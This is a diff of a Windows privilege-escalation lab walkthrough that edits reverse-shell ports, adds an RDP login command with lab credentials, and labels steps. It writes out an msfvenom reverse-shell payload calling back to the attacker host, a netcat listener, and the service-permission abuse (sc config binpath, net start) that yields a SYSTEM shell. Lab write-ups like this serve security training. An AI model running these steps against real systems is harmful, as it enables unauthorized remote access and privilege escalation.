@@ -9,7 +9,7 @@ On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Updat
 **Kali**
 
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=53 -f exe -o reverse.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=54 -f exe -o reverse.exe
 ```
 
 Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.
@@ -27,6 +27,12 @@ On Windows (update the IP address with your Kali IP):
 **Victim**
 
 ```
+xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568 /smart-sizing:800x1200
+```
+
+**Victim**
+
+```
 copy \\$KALI\kali\reverse.exe C:\PrivEsc\reverse.exe
 ```
 
@@ -35,7 +41,7 @@ Test the reverse shell by setting up a netcat listener on Kali:
 Kali
 
 ```
-rlwrap nc -nvlp 53 
+rlwrap nc -nvlp 54 
 ```
 
 Then run the reverse.exe executable on Windows and catch the shell:
@@ -48,35 +54,59 @@ C:\PrivEsc\reverse.exe
 
 The reverse.exe executable will be used in many of the tasks in this room, so don't delete it!
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Exploits - Insecure Service Permissions
 
 Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
 
+**Victim**
+
 ```
 C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
 ```
 
-Note that the "user" account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG).
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Note that the "user" account has the permission to change the service config (S**ERVICE\_CHANGE\_CONFIG**).
 
 Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME):
+
+**Victim**
 
 ```
 sc qc daclsvc
 ```
 
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
 Modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable you created:
 
+**Victim**
+
 ```
-sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
+
+sc qc daclsvc
 ```
 
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
 Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+
+**Kali**
+
+```
+rlwrap nc -nvlp 54 
+```
+
+**Victim**
 
 ```
 net start daclsvc
 ```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Exploits - Unquoted Service Path
 
